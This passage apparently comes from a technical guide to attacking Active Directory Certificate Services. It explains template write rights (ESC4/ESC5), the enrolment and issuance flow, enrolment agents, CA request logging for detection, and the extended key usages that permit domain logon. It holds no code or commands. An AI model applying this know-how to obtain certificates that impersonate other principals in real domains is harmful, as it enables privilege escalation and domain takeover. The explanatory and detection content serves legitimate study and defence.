**Object write permissions** are the ordinary AD write rights: `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `WriteProperty`. These do not let you request anything, they let you *change* the template so that it will issue you something. That is ESC4, and the corresponding rights on other PKI objects are ESC5.

#### The request and issuance flow

The client builds a PKCS#10 certificate signing request containing a public key, a subject, optionally a subject alternative name, and a proof of possession signature over the request with the matching private key. It submits that request naming a template, over one of three interfaces: the MS-ICPR RPC interface on the CA (`\pipe\cert` over SMB or dynamic TCP), the web enrolment endpoint at `/certsrv`, or the Certificate Enrollment Service and Certificate Enrollment Policy web services used for workplace-joined and internet-facing enrolment. NDES adds a fourth for network devices.

The CA authenticates the requester, evaluates the template's ACL, and then applies the template's policy. If the template says the CA builds the subject, the CA discards whatever you asked for and constructs the subject and SAN from the requester's directory object. If the template says the enrollee supplies the subject, the CA copies your values into the issued certificate largely untouched. If manager approval is set, the request is stored in the CA database in a pending state with a request ID and nothing is issued until a certificate manager approves it. If authorised signatures are required, the request must be wrapped in a PKCS#7 signed by a certificate carrying the specified application policy, which is what an **enrolment agent** does: an enrolment agent certificate carries the Certificate Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`) and its holder can co-sign requests on behalf of other principals. Unless the CA restricts enrolment agents by template and by target principal, an agent certificate is a licence to enrol as anybody.

Every request, issued or denied, is written to the CA's request database with the requester's authenticated identity, the template, the attributes requested, the resulting serial number and timestamps. That database is the reason this attack class is loud after the fact, and it is discussed under detection.

#### Extended key usages that matter

The EKU set decides what the certificate is good for. For domain authentication you need one that a domain controller will accept:

| EKU | OID | Note |
| --- | --- | --- |
| Client Authentication | `1.3.6.1.5.5.7.3.2` | The common one |
| PKINIT Client Authentication | `1.3.6.1.5.2.3.4` | Kerberos specific |
| Smart Card Logon | `1.3.6.1.4.1.311.20.2.2` | Also sufficient |
| Any Purpose | `2.5.29.37.0` | Satisfies everything, ESC2 condition |
| No EKU at all | none | Unconstrained, so also sufficient, and this is why the default `SubCA` template is useful in ESC7 |
